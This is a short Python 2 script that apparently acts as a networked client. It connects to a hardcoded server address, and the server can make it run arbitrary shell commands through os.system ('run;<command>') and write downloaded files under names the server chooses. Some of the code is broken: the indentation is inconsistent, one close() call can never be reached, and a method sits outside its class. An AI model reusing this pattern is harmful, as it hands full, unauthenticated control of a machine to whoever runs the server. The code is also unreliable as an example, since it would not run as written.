import socket, threading
import os


class ConnectionThread(threading.Thread):

	def __init__(self, connection):

		threading.Thread.__init__(self)
		self.connection = connection

	def run(self):
		while True:
			try:
				datas = self.connection.recv(1024)
				print("From Server: ", datas)

				if datas == "bye" or datas == '':
					self.connection.close()
					break

				if datas == "check":
					self.connection.sendall("0")

				if datas == "update":

					print ("Update")

					fileServer = socket.socket()
					fileServer.connect((serverAddr, filePort))

					while True:
    					    size = fileServer.recv(16) # Note that you limit your filename length to 255 bytes.
    					    if not size:
        					break
    					    size = int(size, 2)
   					    filename = fileServer.recv(size)
					    filesize = fileServer.recv(32)
					    filesize = int(filesize, 2)
					    file_to_write = open(filename, 'wb')
					    chunksize = 4096
					    while filesize > 0:
					        if filesize < chunksize:
					            chunksize = filesize
					        data = fileServer.recv(chunksize)
					        file_to_write.write(data)
					        filesize -= len(data)

					    file_to_write.close()
					    print 'File received successfully'
				            fileServer.close()

				data = datas.split(";")
					
				if data[0] == 'run':
					os.system(data[1])

			except Exception, msg:
				print ("OPA ", msg)
				break
				self.connection.close()


def sendMsg(self, msg):
	self.connection.sendall(bytes(msg))


serverAddr = "10.0.1.229"
port = 8080
filePort = 8081

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.connect((serverAddr, port))

newThread = ConnectionThread(server)
newThread.start()

while True:
	out_data = raw_input("msg: ")
	server.sendall(bytes(out_data))
	if out_data=='bye':
		break

server.close()
